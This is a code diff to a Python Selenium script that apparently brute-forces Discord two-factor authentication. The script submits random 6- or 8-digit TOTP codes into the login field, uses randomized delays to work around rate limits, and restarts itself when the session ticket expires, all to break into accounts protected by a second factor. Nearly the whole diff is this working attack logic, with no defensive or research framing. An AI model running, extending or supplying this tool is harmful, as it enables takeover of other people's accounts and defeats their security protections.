@@ -109,16 +109,30 @@ def main(mode,code):
 				if totpCount == 0:
 					print("TOTP login field: " + toColor("Found","green"))
 					print("Forcer: " + toColor("Starting","green"))
+
+				# Generate a new 8 or 6 digit number and enter it into the TOTP field
+				totp = gen(1)
+				loginTOTP.send_keys(totp)
+				loginTOTP.send_keys(Keys.RETURN)
+				totpCount += 1
+				
 				#Test for ratelimit
 				if ("The resource is being rate limited." in driver.page_source):
 					print(toColor("Ratelimited.", "yellow"))
 					sleepy = secrets.choice(range(7, 12))
 					ratelimitCount += 1
-					# Wait for delay
-					time.sleep(sleepy)
-					# Retry code that was ratelimited
-					loginTOTP.send_keys(Keys.RETURN)
-				# This means that Discord has expired this login session.
+
+				# This means the password token has expired
+				elif ("Token has expired" in driver.page_source):
+					#  Print this out as well as some statistics, and prompt the user to retry.
+					elapsed = time.time() - start
+					print(toColor("Invalid session ticket.", "red"))
+					print(toColor(f"Number of tried codes: {totpCount}", "blue"))
+					print(toColor(f"Time elapsed for codes: {elapsed}", "blue"))
+					print(toColor(f"Number of ratelimits {ratelimitCount}", "blue"))
+					# Close the browser.
+					driver.close()
+				
 				elif ("Invalid two-factor auth ticket" in driver.page_source):
 					# This means that Discord has expired this login session.
 					#  Print this out as well as some statistics, and prompt the user to retry.
@@ -129,10 +143,11 @@ def main(mode,code):
 					print(toColor(f"Number of ratelimits {ratelimitCount}", "blue"))
 					# Close the browser.
 					driver.close()
+					time.sleep(1)
+					main(mode,code)
 				# The entered TOTP code is invalid. Wait 6-10 seconds, then try again.
 				else:
 					sleepy = secrets.choice(range(6, 10))
-
 				#Testing if the main app UI renders.
 				try:
 					# Wait 1 second, then check if the Discord App's HTML loaded. If loaded, then output it to the user.
@@ -141,23 +156,16 @@ def main(mode,code):
 					print(toColor(f"Code {totp} worked!"))
 					break
 				except NoSuchElementException:
-					# This means that the login was unsuccessful.
+					# This means that the login was unsuccessful so let's inform the user and wait.
+					print("Code: " + toColor(totp, "blue") + " did not work, delay: " + toColor(sleepy, "blue"))
 					time.sleep(sleepy)
 					# Backspace the previously entered TOTP code.
 					for i in range(clear):
 						loginTOTP.send_keys(Keys.BACKSPACE)
 
-					# Generate a new 8 or 6 digit number and enter it into the TOTP field
-					totp = gen(1)
-					loginTOTP.send_keys(totp)
-					loginTOTP.send_keys(Keys.RETURN)
-					totpCount += 1
-
-					print("Code: " + toColor(totp, "blue") + " did not work, delay: " + toColor(sleepy, "blue"))
 				# If the TOTP login field is not found (e.g the user hasn't completed the Captcha/entered a new password, then try again
 		except (NoSuchElementException):
 			pass
-
 
 if __name__ == "__main__":
 	# Ask the user what they want to do
